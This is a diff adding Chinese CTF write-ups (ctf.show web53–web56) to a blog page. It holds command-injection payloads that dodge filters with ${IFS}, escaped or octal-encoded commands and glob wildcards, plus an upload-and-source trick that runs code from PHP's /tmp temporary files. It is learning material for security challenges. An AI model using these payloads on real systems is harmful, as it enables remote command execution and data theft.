@@ -91,6 +91,23 @@ web31过滤system,可以用exec,passthru. 过滤cat,可以用tac tail.">
 <p>?c&#x3D;tac&lt;fl’’ag.php%0a</p>
 <h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>?c&#x3D;t\ac&lt;&gt;fl’’ag.php%0a</p>
 <h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>flag在根目录payload:?c&#x3D;t\ac$IFS&#x2F;fl’’ag%0a这题$IFS就能用，上面的题用不了。。。不知道为啥</p>
+<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>基本与上题一样</p>
+<p>?c&#x3D;c\at${IFS}fl’’ag.php</p>
+<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>将内容复制到其他文件</p>
+<p>?c&#x3D;cp${IFS}f?ag.php${IFS}a</p>
+<p>然后访问a文件即可</p>
+<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>过滤了字母，但是没过滤空格，?c&#x3D;$’\143\141\164’ $’\146\154\141\147\56\160\150\160’</p>
+<p>在Linux中<code>$&#39;\141&#39;</code>会将<code>\141</code>以八进制形式转义成对应十进制ascii码字符,</p>
+<p>$’\143\141\164’ $’\146\154\141\147\56\160\150\160’相当于cat flag.php</p>
+<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>文件上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;https://c0b10812-fbf5-488f-9f22-432db9043da9.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用该html文件上传一个文件，并抓包，修改文件内容为#!&#x2F;bin&#x2F;sh cat flag.php</p>
+<p>payload:    ?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[] </p>
+<p>在linux中<code>.</code>相当于<code>source</code>指令，可以执行<code>.sh</code>脚本</p>
+<p>在php中，post上传文件会在&#x2F;tmp目录下生成一个<code>php??????</code>临时文件(<code>?</code>为随机大小写字母)，在请求结束之后，该临时文件才会被清除</p>
+<p>这样，就可以构造一个请求利用<code>.</code>执行上传的临时文件，如<code>. /???/?????????</code></p>
+<p>利用glob通配符，<code>[@-[]</code>，覆盖所有大写字母，这样就能匹配到该临时文件从而执行</p>
 </section>
     
         
